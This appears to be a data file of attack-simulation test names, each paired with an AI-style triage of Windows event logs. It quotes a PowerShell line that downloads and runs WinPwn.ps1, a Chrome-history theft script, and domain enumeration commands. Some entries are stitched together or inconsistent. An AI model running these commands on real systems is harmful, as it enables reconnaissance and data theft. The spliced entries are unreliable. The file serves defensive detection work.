WinPwn - GeneralRecon,"**Analysis:**

Upon reviewing the provided logs, several items and behaviors of interest were identified:

1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`:**
   - There is frequent execution of `wevtutil.exe`, a legitimate tool for Windows Event Log management, and `conhost.exe`, within a very short period (milliseconds apart). These were executed by the user `SERVER002\admin_test`. The repeated and rapid execution of these processes could imply automation or a scripted activity that might need further contextual information to clarify its intention.

2. **Execution of `powershell.exe` with Suspicious Command:**
   - Notably, there is a PowerShell process with a command line that downloads and executes a script from a URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). The script `WinPwn.ps1` from this repository is known for being used in penetration testing scenarios and can conduct unauthorized reconnaissance or exploitation if used maliciously. This type of activity is typically flagged as potentially malicious as it corresponds with use-cases of unauthorized intrusion or attacks.
   - Additionally, the `Whoami` command and `HOSTNAME.exe` execution appear benign but were executed around the same time, potentially as part of the same script or automated task.

3. **Other Software Update Activities:**
   - Multiple activities related to Microsoft Edge Update are noted. These appear standard for software updates and generally align with typical software maintenance tasks. They were executed by the `NT AUTHORITY\SYSTEM` account, which is standard for these operations.

4. **System Integrity:**
   - The Application log entries confirm that Windows Defender was active, as the ""SECURITY_PRODUCT_STATE_ON"" for Windows Defender was logged. 

**Assessment:**

- **SUSPICIOUS:**
  - The use of `powershell.exe` to execute a remotely hosted script (`WinPwn.ps1`) is suspicious and could be indicative of potentially unauthorized activities. WinPwn scripts are often leveraged in security testing or cyber attacks to gain sensitive information or attack the system.
  - While other entries related to system and EdgeUpdates appear routine, the PowerShell activity requires further investigation to confirm the intent and nature of the execution.

**Guidance on How to Proceed:**

1. **Immediate Actions:**
   - **Isolate the Host:** Temporarily isolate the host (Server002) from the network to prevent any potential spread or data exfiltration.
   - **Analyze Network Logs:** Check for any outbound connections correlating with the execution time of the PowerShell script to external IPs, especially to `githubusercontent.com`.
   - **Investigate User Activity:** Review the user's (`SERVER002\admin_test`) recent activities and permissions, particularly any new accounts, privilege changes, or external server connections.

2. **Remediation Steps:**
   - **Block External Script Execution:** Ensure that policies are in place preventing the unsolicited execution of scripts from external sources, particularly using PowerShell without administrative approval.
   - **Conduct a System Scan:** Use updated security software to perform a thorough scan of the system for signs of compromise or persistence mechanisms.
   - **Review Security Logs:** Investigate past and future security and system logs for signs of anomaly or misused system tools similar to those identified.

   - **Update Security Alerts:** Ensure alerts are configured to detect similar suspicious activities, particularly remote script downloads and executions via PowerShell.
   - **User Education:** Reinforce awareness and educate users on safe practices to avoid running suspicious scripts.

By following these steps, the organization can better ascertain whether the suspicious activity was part of a legitimate security assessment, a benign task gone wrong, or an actual malicious attempt, and can implement remediation and prevention accordingly."
Permission Groups Discovery PowerShell (Domain),"Based on the provided Windows event logs, here's the detailed analysis:

**Summary of Activity:**
1. **Sysmon Logs:**
   - Multiple executions of standard Windows utilities (`whoami.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, `powershell.exe`) performed by `SERVER002\admin_test`.
   - `wevtutil.exe` is used several times. This tool is often used to manage event logs, which can be benign but sometimes used maliciously to clear logs.
   - PowerShell execution with a specific cmdlet to get group membership, which can be a legitimate administrative task.
   - Series of actions related to Microsoft Edge Update processes running under `NT AUTHORITY\SYSTEM`, indicating scheduled or automatic updates.

2. **PowerShell Logs:**
   - The execution context indicates the use of PowerShell to retrieve Active Directory group membership information using `get-ADPrincipalGroupMembership`.

3. **Application Logs:**
   - Contains notification of the `edgeupdate` service stopping, possibly due to completed update tasks.

4. **System Logs:**
   - Standard time synchronization event.

**Indicators of Compromise:**
- The execution of `wevtutil.exe` is notable but, without further context or additional suspicious commands to clear logs, it remains benign.
- PowerShell commands appear routine but should always be scrutinized, especially if scripts or cmdlets are unfamiliar or aimed at sensitive tasks (e.g., user enumeration).

**Assessment of Events:**
- The logs do not contain any 100% definitive indicators of malicious activity. The processes observed could result from administrative or system management tasks.
- The PowerShell activity, given the nature of the command, aligns with administrative querying without signs of abuse.

**Resolution:**
- **BENIGN**: The logs do not show any 100% malicious activities and mostly reflect standard, possibly administrative operations. If any anomaly is speculated about, such as using `wevtutil`, a policy can be established to monitor its use.

**Guidance on How to Proceed:**
- Ensure PowerShell and command line auditing is enabled to capture full command details and evaluate the frequency and purpose of commands.
- Consider employing security measures for enhanced logging and anomaly detection to preemptively detect unusual patterns or usage.
- Conduct regular reviews with IT staff to ensure activities like updates and service operations are understood and documented."
Remote System Discovery - net group Domain Computers,"Based on the analysis of the provided logs, I've identified the following key activities:

1. **Time Synchronization Events:**
   - There are several `EventID 24` and `EventID 1` from the `Microsoft-Windows-Kernel-General` provider indicating minor time synchronization. These involve very slight changes in system time, likely due to network time protocol (NTP) synchronization.

2. **Windows Update Events:**
   - Multiple events from the `Microsoft-Windows-WindowsUpdateClient` (`EventID 44`, `EventID 43`, `EventID 19`) indicate a Microsoft Defender Antivirus update (KB2267602). This represents normal system update activities.

3. **Process Executions:**
   - **Sysmon logs** show the execution of legitimate system processes like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `HOSTNAME.EXE`, `cmd.exe`, `net.exe`, and `net1.exe`. These executions happen with high integrity but do not show particularly unusual behavior.
   - The command `cmd.exe /c net group ""Domain Computers"" /domain` could indicate enumeration of domain computers, possibly pointing towards information gathering. However, since this was executed by the admin_test user, it may be part of legitimate administrative activities.

4. **Privilege Use and Logon Events:**
   - The `Security` log contains `EventID 4672`, indicating the admin_test user had a series of privileges like `SeDebugPrivilege, SeBackupPrivilege`, etc. `EventID 4624` confirms network logons using NTLM, while `EventID 4634` denotes logoffs, typical of remote or automated logon sessions.
   - These activities align with normal high-privilege user actions but are worth monitoring due to the elevated permissions involved.

5. **Credential Operation Events:**
   - Multiple `EventID 5379` indicating credential validation operations, resulting in return codes pointing towards failures or no credentials being returned. This might reflect routine operations where certain caches are not returned or checks are conducted.

6. **Defender and System Security:**
   - The `SecurityCenter` event log confirms Windows Defender is active with `SECURITY_PRODUCT_STATE_ON`, indicating no apparent deactivation which could be a sign of compromise.

**Assessment:**
Based on the current evidence, no overt indicators of compromise (IoCs) or malicious activities stand out. The logs primarily reflect routine system actions, configurations, privilege usages typical in an administrative and update setting, and a cybersecurity product update process. The elevated privilege usage and domain enumeration execute under a known user account, which, while notable, doesn't confirm malicious intent without additional context.

**Resolution: SUSPICIOUS**
While there are no clear signs of malicious activity in the logs, the use of high privilege processes and domain enumeration might benefit from further review to ensure they align with expected administrative activities and the user's typical behavior. I recommend corroborating these events with broader context around the `admin_test` user's tasks or intentions during this timeframe, consulting threat intelligence for any recent vulnerabilities involving legitimate admin tools, and potentially setting monitoring alerts for similar future activities.
"
Extract chrome Browsing History,"Upon analyzing the given Windows event logs, I have identified several patterns and behaviors that indicate suspicious activity, but not necessarily malicious beyond a reasonable doubt. Let’s break down the findings:

1. **Frequent Execution of PowerShell Script**: 
   - A PowerShell script is being executed, aiming to extract browsing history from Chrome (```powershell.exe & {$Username = (whoami).Split('\\')[1], $URL_Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&amp;=]*)*?', $History = Get-Content -Path \\\""\""$Env:systemdrive\\Users\\$UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\\\""\"" | Select-String -AllMatches $URL_Regex...}```).
   - Storing extracted history in a specific text file (`chromebrowsinghistory.txt`).
   - This form of scripting could be traditional sysadmin behavior or the result of a malicious actor trying to extract information stealthily.

2. **Multiple Executions of `wevtutil.exe` and `conhost.exe`**:
   - Repeated instances of `wevtutil.exe` (a tool to manage event logs) and `conhost.exe` (used for command prompt hosting).
   - Executed under the account `SERVER002\\admin_test`.
   - Such activity could be typical of log management processes but could also signal an attempt to clean or tamper with logs in case of unauthorized access.

3. **Regular System Process Executions**:
   - Common system processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `HOSTNAME.EXE`, and processes related to `Microsoft Edge Update` are frequently executed.
   - While many of these actions can be legitimate, they could indicate suspicious behavior, especially under an administrative user account (`SERVER002\\admin_test`).

4. **Host Name and User Enumeration**:
   - Usage of `whoami.exe` and `HOSTNAME.EXE` could imply reconnaissance to gather information about the system components and environment.
   - Normally, such activity might appear in regular operations but warrants caution if conducted outside routine management tasks.

5. **Legitimate Processes Run with SYSTEM Privileges**:
   - Several Microsoft Edge Update processes run with `NT AUTHORITY\\SYSTEM` privileges, suggesting possibly legitimate or updating activity.

6. **Log Entries Consistent with Legitimate Software Updates**:
   - Many entries appear related to software updates, especially for Microsoft Edge, involving files like `MicrosoftEdgeUpdate.exe`.
   - No indicators show tampering or unusual modifications within these processes.

### Assessment:
Given the details, the presence of automated PowerShell scripts directly extracting browsing history, alongside multiple invocations of potentially sensitive tools like `wevtutil.exe`, needs caution. Without additional context confirming these activities' legitimacy, an immediate conclusion about malicious intent cannot be reached. The nature and timing of commands and processes, particularly if unplanned, would be prime for concern.

### Resolution:
- **SUSPICIOUS**: The logs contain activities that appear out of the ordinary and necessitate further investigation. While there's suspicious behavior with the PowerShell usage and attempts to discern system environment details, direct evidence of malicious intent or compromise isn't concretely present at this stage.

### Recommendations:
1. **Further Investigation**:
   - Validate the origin and authorization of the PowerShell commands and any scheduled tasks or users expected to conduct such operations.
   - Look into the admin account activities (`SERVER002\\admin_test`) to ensure no unauthorized access or rogue usage.
   
2. **Monitoring and Alerting**:
   - Implement monitoring for similar PowerShell scripts and occurrences of tools like `wevtutil.exe` to prevent or promptly respond to potential misuse.
   - Escalate and review event logs, focusing on privilege elevation or unscheduled remote executions.
   
3. **Security Audit**:
   - Conduct an audit on the machine for unscheduled or recent privilege changes, configuration modifications, and background tasks.

Conclusively, there is no direct evidence pointing to overtly malicious activity without deeper contextual analysis, rendering the situation as warranting further vigilance and review."

  - The command execution through `cmd.exe` involving AWS interactions could suggest automation scripts, scheduled tasks, or development/testing activities. Without more context, this requires further scrutiny to ensure it is sanctioned and review associated AWS accounts for any unauthorized access.
  - Although `wevtutil.exe` execution appears in a higher volume than typical, if consistent with scheduled log rotations or robustness checks, it might be benign. But it remains important to ensure these are authorized uses.
  
### Resolution:
- **SUSPICIOUS** - Based on the entries related to `cmd.exe` with AWS CLI and potential for `wevtutil.exe` misuse without definitive indicators of malicious intent. Further investigation is warranted to track user permissions, process origins, and corroborate policy adherence, particularly focusing on AWS access logs and system audit trails linked to these commands."
Check computer location,"### Detailed Analysis of the Logs:
Upon reviewing the provided Windows event logs, several activities stand out. Here is a detailed analysis focusing on suspicious behaviors observed:

1. **Time Synchronization Events:**
   - **Security Event 4616 and System Event 1:**
     - These logs report changes in system time and timezone adjustments. Such activity could be legitimate, corresponding with NTP adjustments; however, frequent and irregular adjustments can mask unauthorized activities by disorienting time-based log analysis.
     - The adjustments here seem routine and involve the time.windows.com NTP server, suggesting benign intent.

2. **Process Creation and Execution:**
   - **Sysmon Event 1 (Process Creation):**
     - Multiple instances of `wevtutil.exe` and `conhost.exe` executed by a user named `admin_test` suggest interactive or scripted execution of tasks.
     - The use of `wevtutil.exe` might be for legitimate administrative tasks such as clearing event logs, but can also indicate attempts to cover tracks in case of compromised activities.
     - There are also executions of commands like `cmd.exe` executing registry checks, which are not typical for regular operations unless specifically part of a script routine for configuration checks or similar tasks.
   - **Execution of `whoami.exe`**:
     - The `whoami.exe` command is executed under high integrity, which is typically used for checking which user the command is run under. While this is not inherently malicious, it could indicate reconnaissance behavior.

3. **Microsoft Edge Update Processes:**
   - **Multiple Edge Update Executions:**
     - Numerous instances of Microsoft Edge Update processes are seen. These relate to `MicrosoftEdgeUpdate.exe` and associated setup and registration tasks.
     - The provided `CommandLine` arguments and process lineage suggest they're legitimate update processes. However, the logs should be scrutinized if the timing correlates with anomalous events or unauthorized installations.
     - The sequence of updates and registrations performed by the EdgeUpdate process suggests routine operation given the involvement of Microsoft's genuine files and expected directory structures.

### Assessment of Situation: 
- **Time changes** appear routine and are tied to system syncing processes. There's no immediate sign of manipulation beyond routine updates from authoritative time servers.
- **Process Executions** such as `wevtutil.exe`, commands like `cmd.exe` querying the registry, and `whoami.exe` could represent admin or maintenance activities. However, repeated and scripted-like execution of commands by `admin_test` would warrant verification of the tasks or scripts scheduled for execution.
- **Edge Update Processes** mostly align with routine background update operations for Microsoft Edge, given continuity and Microsoft's genuine file signatures.

### Threats or Risks Identified:
- Actions such as querying registry settings and checking user credentials may denote reconnaissance or preparation phases of potential malicious activity, yet no clear payloads or malicious alterations are observed in these logs. It would be prudent to verify intended activities by `admin_test`.

### Recommended Guidance:
- **Confirm and Verify Administrative Actions**: Cross-reference the `admin_test` user's activities with documented IT tasks, change management records, or scheduled administrative scripts to ensure these align with authorized operations.
- **Monitoring**: Implement monitoring for unusual command executions, particularly those interacting with event logs and registry settings for potential anomaly detection.

### Resolution:
After reviewing the provided logs:
**Resolution: SUSPICIOUS** - The activity detected requires further investigation to confirm whether `admin_test` executed these activities as part of legitimate tasks. The behavior is unusual—detailing log queries and user checks—and warrants validation against known authorized tasks or scripts."
System Time Discovery,"Upon examining the logs provided from the Windows host ""Server002"", the following analysis and observations are made:

### Analysis
1. **System Log:**
   - The system log shows typical operations, including Windows updates and time synchronization with `time.windows.com`. The presence of `svchost.exe` for time synchronization is normal and expected. No anomalies detected here.

2. **Application Log:**
   - The application log entries pertain to service stops for `edgeupdate`, which is part of the Microsoft Edge update service. This behavior aligns with standard update processes and does not indicate malicious activity.

3. **Security Log:**
   - The security log includes time change events (EventID 4616), which coincide with time synchronization activities noted in the system log. The use of `svchost.exe` for these tasks is typical and expected. No unauthorized time changes or abnormal activity are present.

4. **Sysmon Log:**
   - The logs show multiple process creation events, many involving standard Windows executables such as `whoami.exe`, `cmd.exe`, `net.exe`, and others associated with Microsoft processes.
   - There are numerous entries related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) functioning within its expected directories (`C:\Program Files (x86)\Microsoft\EdgeUpdate`). These events show processes being created and terminated in a manner consistent with update operations.
   - The command execution `""cmd.exe"" /c net time \\localhost & w32tm /tz` is observed. While executing `net time` could be considered suspicious in some contexts if initiated by unauthorized users, here it is executed with a high integrity level by `admin_test` users, which suggests authorized usage for system configuration.

### Assessment

   - The execution of script-related tools like `WindowsPowerShell` with the command involving `([adsisearcher]""objectcategory=group"").FindAll(); ([adsisearcher]""objectcategory=group"").FindOne()` suggests potentially legitimate administrative activity. However, PowerShell's powerful capabilities can be leveraged for post-exploitation activities, so its execution should be verified within the context of authorized administrative tasks.

2. **PowerShell Invocation:**
   - The PowerShell command observed appears to be querying Active Directory information. This might be part of routine administrative operations, or it could potentially be an indicator of reconnaissance activities if executed by unauthorized users.

3. **Log Entries and Timing:**
   - The sequence and frequency of events such as the execution of `wevtutil.exe`, which is often used for managing Windows Event logs, could imply log clearing or querying. Particularly, if the PowerShell commands were used to export or manipulate event logs.
   
4. **Anomalies in Time Entries:**
   - The event logs indicate a minor adjustment in system time, which could be normal depending on time synchronization settings.
   - Events `4616` from the Security log and corresponding System logs related to time change are not inherently malicious but should be checked against normal policy to ensure no unauthorized time tampering occurred.

5. **Potential Indicators of Suspicion:**
   - The high frequency of PowerShell activity and the use of advanced query techniques may warrant a deeper inspection to validate if these were within the scope of normal activities or if they align with known malicious patterns or unauthorized data gathering.

Based on the analysis, while there are several benign Windows processes observed, certain aspects such as the PowerShell commands and frequent event log tool invocations are worth further scrutiny to rule out misuse. The combination of these may suggest suspicious activity if not adequately justified by legitimate administrative tasks.

**Resolution:** SUSPICIOUS

**Guidance on How to Proceed:**
- Verify if the PowerShell command logged is executed by a legitimate and authorized admin task.
- Investigate the purpose of frequent `wevtutil.exe` executions to ensure no unintended log manipulations.
- Review any recent administrative task requests or changes to network policy that explain these logs.
- If necessary, conduct interviews or checks with the users identified in the logs (SERVER002\admin_test).
- Consider enabling additional logging or using network detection tools to capture any future anomalies in real-time."
Enumerate Active Directory Groups with Get-AdGroup,"### Detailed Analysis of the Provided Logs

#### 1. **Windows PowerShell Log Analysis:**
   - **Events 1043 to 1050:** These logs show a PowerShell session that includes the command `Get-AdGroup -Filter *`. This command is often used for legitimate administrative purposes to query all Active Directory groups. There is no indication of malicious command execution or script use within these entries. No further indicators suggest this PowerShell activity is associated with malicious behavior.

#### 2. **Sysmon Log Analysis:**
   - **Image Execution Entries:** There are recurring entries of `wevtutil.exe` and `conhost.exe`, both running under the `SERVER002\admin_test` user. `wevtutil.exe` is a legitimate Windows tool used to manage event logs, and `conhost.exe` is a normal part of Windows operations for console windows. The presence of these processes alone is not suspicious without additional context indicating misuse.
   - **`HOSTNAME.EXE`, `whoami.exe`, and `PowerShell.EXE`:** The execution of these system utilities typically indicates system diagnostics or querying user info. The command lines do not show signs of suspicious activity, such as obfuscation or attempts to retrieve sensitive information.
   - **EdgeUpdate Activity:** Multiple processes related to Microsoft Edge Update are running under `NT AUTHORITY\SYSTEM`. This activity aligns with routine software update operations and does not indicate malicious behavior.

#### 3. **Application Log Analysis:**
   - **EdgeUpdate Service Stopped Messages:** These logs merely indicate normal service operations related to Microsoft Edge updates. The stopping of services without corresponding abnormal entries does not inherently suggest suspicious actions.

#### 4. **System Log Analysis:**
   - **Time Change Events:** Logs indicate normal time-related activity associated with `svchost.exe` as the system syncs time with `time.windows.com`. There is no evidence of time manipulation that would suggest tampering with logs or covering tracks.

#### 5. **Security Log Analysis:**
   - **Logon Activities:** Events with IDs `4624` and `4672` show successful logons and assignments of elevated privileges to the user `admin_test`, indicating normal administrative operations. NTLM logons are not unusual in many network environments.
   - **Time Change Event (ID 4616):** Reflects a time correction operation likely linked to the time service, consistent with the system log.

### Assessment & Resolution

- No clear evidence of malicious behavior or compromise is evident from the provided logs. The PowerShell activity involves a standard command for querying Active Directory groups, and system utilities such as `wevtutil.exe`, `conhost.exe`, and update services like Edge Update are operating as expected within system and administrative contexts.

- **Final Resolution:** **BENIGN** - The log activities analyzed are consistent with regular system and administrative operations, with no recognizable signs of malicious activity or indicators of compromise. Further proactive monitoring is advised, but no immediate action is required based on these logs."
Remote Desktop Services Discovery via PowerShell,"### Detailed Analysis

#### System Log
1. **Time Change Events:**
   - The logs show a series of ""Microsoft-Windows-Kernel-General"" events logged due to time changes. The ""New Time"" and ""Old Time"" fields indicate that the system time was updated, meaning the clock was adjusted backward by 28 milliseconds. This could be a natural synchronization event with a time server or could suggest tampering if it aligns with unauthorized changes.

2. **Time Service:**
   - The time was synchronized with `time.windows.com`, which is a typical source for time synchronization. This is not inherently suspicious unless repeated or drastically erroneous syncs occur.

#### Sysmon Log
1. **Process Executions:**
   - Multiple executions of system utilities like `wevtutil.exe`, `conhost.exe`, and `hostname.exe`. These executables are Windows utilities and the actions logged seem to be normal administrative tasks.
   - `powershell.exe` execution querying for services like ""Remote Desktop Services"" and ""Remote Desktop Configuration"" might generally be administrative but could be seen as suspicious if unexpected, especially if linked with privilege escalation.

2. **Microsoft Edge Update:**
   - The logs indicate the execution of Microsoft Edge Installer and associated temporary setups. This corresponds with an update or installation process for Microsoft Edge, usually a normal automated or user-initiated activity.

#### Windows PowerShell Log
- **PowerShell Activity:**
  - PowerShell execution with the command `Get-Service -Name ""Remote Desktop Services"", ""Remote Desktop Configuration""` is logged. This is a normal administrative command to check the status of RDP services, but it could be considered slightly suspicious if it's an unusual action for the typical pattern of usage on this host.

#### Security Log
1. **Login and Privileges:**
   - Multiple logon events for user `admin_test` with elevated privileges. The `admin_test` account has a set of powerful privileges (e.g., `SeDebugPrivilege`), which are typical for an admin user but should be monitored for misuse or unexpected logon times.
   - The use of NTLM authentication for logins is noted. This is not inherently suspicious but is important in identifying patterns of authentication that may be anomalous.

#### Application Log
- **SPP Service:**
  - The Software Protection Platform Service event logs indicate typical operation. This service ensures Windows licensing and activation systems are operating correctly.

### Assessment

- The log entries observed are mostly aligned with typical administrative behaviors and system updates.
- Although there are PowerShell and administrative tasks, these do not outright indicate malicious activity without further context indicating misuse.

### Resolution
- **SUSPICIOUS** - The PowerShell activity coupled with time adjustments requires verification if it aligns with expected operational patterns and scheduled tasks/administrative actions.
- **Guidance:**
  - Confirm that the `admin_test` activities align with expected administrative operations.
  - Investigate if the time change aligns with a legitimate activity such as NTP adjustments.
  - Monitor for any recurring or out-of-hours activity for anomalies.
  - Confirm that the PowerShell command was executed by a legitimate administrator and for a legitimate purpose."
Port Scan using python,"Upon reviewing the provided Windows event logs from the PowerShell, Security, System, Application, and Sysmon channels, several points of interest and potential indicators of suspicious activity have been identified:

### PowerShell Log Analysis:
1. **Suspicious Process Execution**:
   - A PowerShell command executed to create a directory and download an executable (`python-3.10.4-amd64.exe`) from the internet onto the local machine. 
   - The executable was then run with a silent install command (`/quiet InstallAllUsers=1 PrependPath=1 Include_test=0`). 
   - The presence of downloading and executing binaries, especially if unsolicited, is a common technique used in initial stages of a compromise.

2. **Command Execution**:
   - Subsequent execution of a Python script (`data.py`) locally with an argument of `-i 127.0.0.1`. This suggests potential local testing or data processing, but could be part of a malicious payload execution.

### Security Log Analysis:
1. **Account Enumeration**:
   - Multiple Event ID 4798, which indicates the enumeration of local accounts including Administrator, admin_test, and other built-in accounts (`Guest, WDAGUtilityAccount, etc.`) via `CompatTelRunner.exe`.
   - Enumeration of user accounts can be a precursor to privilege escalation or lateral movement.

2. **Service Account Activity**:
   - Process executions associated with `NT AUTHORITY\SYSTEM`, which align with certain high-privileged activities, including their involvement in `CompatTelRunner.exe` running account enumerations.

### System Log Analysis:
- Activity mainly revolves around routine system updates and telemetry. These logs do not indicate malicious behavior on their own but can be correlated with any unusual activity observed in other logs.

### Sysmon Log Analysis:
1. **Process Execution**:
   - Multiple `ProcessCreate` events for `python_setup.exe` and other similarly named files in the user's Temp directory.
   - This aligns with the PowerShell logs showing downloading and execution of the Python installer, a behavior frequently linked with suspicious activity when done in user temp directories.

2. **Privilege Escalation**:
   - `CompatTelRunner.exe` processes running with system privileges and against security enumerations could be an indication of privilege abuse or an attacker attempting to gather information about user permissions.

### Assessment and Resolution:
Based on the collected indicators:
- A few patterns suggest deliberate execution of potentially malicious activity, such as downloading and execution of binaries via PowerShell, coupled with account enumeration using high-privilege accounts.
- This scenario fits tactics often associated with initial access and reconnaissance in a compromised environment.

### Resolution: **SUSPICIOUS**
- The activities observed are suspicious because they match known tactics used in many types of network breaches, particularly with the use of scripts to download and silently execute installers.
- Further investigation is recommended. This should include verifying the legitimacy of the actions (e.g., whether they are part of legitimate administrative scripts or policy), and checking for any corroborating signs of compromise in additional logs or via a direct system inspection. 

### Guidance:
- **Immediate actions should include:**
  - Isolating the affected host from the network to prevent lateral movement.
  - Performing a thorough malware and indicator sweep on the involved machine.
  - Conducting user outreach to validate whether the actions were legitimate or authorized.
  - Enhancing logging and monitoring for similar behavior across the network to detect potential threats.
"
Windows Internal Packet Capture,"Upon reviewing the provided log entries, here are the key points of analysis:

1. **Sysmon Logs**:
   - Several events show the execution of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `netsh.exe` by the user `SERVER002\admin_test`. These are legitimate Windows tools often used for administrative purposes.
   - The `cmd.exe` instance with the command line `""cmd.exe"" /c netsh trace start capture=yes tracefile=%%temp%%\trace.etl maxsize=10` indicates the starting of a network trace. This action, while legitimate, may be of interest if not initiated by an authorized administrator.
   - The `whoami.exe` and `hostname.exe` executions are benign, commonly used to verify the user's identity and machine name.

2. **Application and System Logs**:
   - The `Microsoft-Windows-Security-SPP` log entry and `Microsoft-Windows-Kernel-General` entries appear routine with no indications of abnormal activity. The time adjustments and server updates mentioned are standard procedures.

3. **Security Logs**:
   - The log entry `4624` indicates a successful logon event of type 5, which is a service startup logon. This is expected for system processes running under the SYSTEM account.
   - Event `4672` shows the granting of special privileges to the SYSTEM account, expected during normal service operations.

4. **Analysis Summary**:
   - The actions recorded in the logs could be administrative tasks executed by a legitimate user or service account. The frequent use of system utilities does not immediately indicate malicious behavior but requires verification regarding whether the user `SERVER002\admin_test` was authorized to execute these commands.

5. **Determination**:
   - **Resolution**: **SUSPICIOUS**
   - **Reason**: While there is no conclusive evidence of malicious activity, the execution of network tracing commands without explicit documentation of authorization raises a red flag. It could be part of normal administrative procedures, but to rule out potential insider threats or unauthorized access, further investigation is required.

**Guidance for Further Action**:
- Verify the actions with the local administrator or responsible team to ensure they authorized these actions.
- Review the context around the execution of network tracing to ensure compliance with internal policies.
- Implement more comprehensive monitoring for accounts executing system utilities and network tracing to ensure they align with organizational policy."
List Process Main Windows - C# .NET,"### Detailed Analysis of Windows Event Logs:

#### Security Log Analysis:

- **Event ID 5379**: This event is related to credential validation operations. The repeated log entries with `ReturnCode` 3221226021 indicate a failure in credential validation. The return code translates to `STATUS_NO_SUCH_USER`, suggesting attempts to validate non-existent credentials for a Microsoft account or Windows Live token and cert. This could indicate attempts at unauthorized access with incorrect or nonexistent credentials. However, since these did not succeed, they present more of a brute force warning if patterns persist.

#### System Log Analysis:

- **Event ID 44 & 43**: These indicate a successful update of the Microsoft Defender Antivirus definition. Software updates are generally benign activities ensuring system security.

#### Sysmon Log Analysis:

- **Event ID 5 and 1**: Multiple entries indicate various process executions, notably PowerShell (powershell.exe), Command Prompt (cmd.exe), and .NET C# Compiler (csc.exe), amongst others. The combination of these processes, particularly cmd.exe executing the compiler csc.exe to generate and run `data.exe` from a temporary location, stands out as suspicious. The creation of an executable on-the-fly in a temporary directory is often seen in malicious activities, such as malware attempting to compile and run scripts dynamically.

- The execution of `wevtutil.exe` to export event logs (`\""C:\\Windows\\system32\\wevtutil.exe\"" epl...`) is suspicious, as it may indicate an attempt to hide tracks or collect log evidence.

- **Potential Privilege Abuse**: The processes were executed with high integrity levels, suggesting they had elevated privileges, making them potential vectors for privilege escalation if initiated maliciously.

#### Additional Considerations:

- **PowerShell Use**: The presence of powershell.exe being triggered can be an indicator of malicious activity, especially if used for obfuscated scripts or unauthorized administrative actions.
  
- **Unused Fields in Logs**: The absence of an operator or description in some `data.exe` related logs suggests non-standard file operations, a red flag for potentially crafted executables.

### Conclusion and Recommendation:

Based on the analysis of the provided logs, there is substantial evidence to categorize the activity as **SUSPICIOUS**. The sequence of activities involving processes like cmd.exe executing scripts, dynamic creation of executables, and log exportation is non-standard and potentially malicious. Further investigation should be conducted to verify the intentions behind these activities, such as reviewing the contents of `data.cs`, examining who initiated the processes, and correlating with any network activity or alerts from other security systems.

#### Guidance:
- **Isolate Host**: If feasible, isolate the host for a more in-depth analysis.
- **Further Investigation**: Correlate with other logs (network, IDS/IPS) and endpoint security alerts.
- **Forensic Analysis**: Consider a forensic backup for further analysis to understand the intention and potential impacts.
- **User Behavior and Permissions**: Verify user `admin_test` activities for abnormal behaviors and consider revisiting privilege allocations.
- **Third-Party Security Solution Scan**: Conduct malware scanning using additional security tools beyond built-in Windows Defender mechanisms. 

Resolution: **SUSPICIOUS** (needs more investigation)."
Powershell enumerate domains and forests,"After analyzing the provided logs from the Windows machine, the following observations are made:

1. **Logon Events and Privilege Use**:
   - Several logon events with Event ID 4624 are recorded for the SYSTEM account, which is a standard event for services starting or scheduled tasks executing under the built-in system account.
   - Event ID 4672 indicates that privileges were assigned to the SYSTEM account. These privileges are deep, including SeDebugPrivilege and SeImpersonatePrivilege, which can be potentially leveraged in a privilege escalation attack. However, these privileges are standard for the SYSTEM account.

2. **User Enumeration and Process Execution**:
   - Event ID 4798, which records account enumeration activities, shows access to multiple user accounts (Administrator, admin_test, DefaultAccount, Guest, lplui). This indicates a script or tool is checking group memberships for several accounts from the SYSTEM account via taskhostw.exe, which can be suspicious if not expected behavior.
   - It is noted that `admin_test` was logged in as a user and executed several processes using PowerShell (including the loading of PowerView.ps1), a tool known for Active Directory enumeration and network discovery.

3. **Sysmon Event Analysis**:
   - Sysmon logs indicate the execution of PowerShell with the execution of PowerView.ps1, retrieving information about network trusts which is typically associated with reconnaissance activity. This can be an indicator of a Penetration Test or an attempt to discover domain information stealthily.
   - Various standard Windows services and applications like `wevtutil.exe`, `conhost.exe`, and `sc.exe` are detected running, which are typical but could indicate suspicious activity as supporting tools in unusual or malicious scripts.

4. **Windows PowerShell Logs**:
   - The PowerShell logs confirm the execution of the PowerView script with commands aimed at gathering domain and network-related information.

The combination of PowerView execution, the account enumeration, and the logs of command-line activity through PowerShell indicates suspicious behavior. This type of activity could represent a potential reconnaissance phase of an attack or a penetration test if not expected.

### Conclusion:
**Resolution: SUSPICIOUS** - The patterns of user account enumeration, execution of network discovery tools (like PowerView), and general reconnaissance activity through PowerShell signal potentially suspicious activity. This activity warrants further investigation to determine the legitimacy, especially if no test was authorized, or if there is unexpected behavior on the network.

### Recommended Actions:
- Verify any authorized penetration testing activities. If such tests are authorized, ensure they were conducted in this timeframe.
- Ensure enhanced logging and alerts are active for PowerShell commands and privilege escalations to improve future detections.
- Consider detailed review and tighter access controls and monitoring for accounts used to run scripts and automated tasks to prevent unauthorized use."
Adfind - Enumerate Active Directory Subnet Objects,"Based on the analysis of the provided logs, here's a detailed breakdown of findings:

1. **Application Logs**:
   - Multiple entries indicating that Windows Defender is active (state: SECURITY_PRODUCT_STATE_ON). These entries are common and expected for defense systems, showing that antivirus is operational.

2. **Sysmon Logs**:
   - **wuauclt.exe**: This is a legitimate Windows Update client process. The logs show its normal operation updating anti-malware and other definitions.
   - **AM_Delta.exe and MpSigStub.exe**: These processes are part of Windows Defender updates, executing antivirus definitions. Their presence is typical during updates.
   - **Powershell.exe, conhost.exe, and wevtutil.exe**: Executed by the user SERVER002\admin_test. While PowerShell usage can be exploited, there is no indication of malicious command-line parameters or suspicious parent processes here, suggesting legitimate usage.
   - **AdFind.exe**: This appears questionable as it is being executed via cmd, indicating potential Active Directory reconnaissance, typically associated with network enumeration. The file path includes the Windows temp directory, which is often used by malicious scripts.
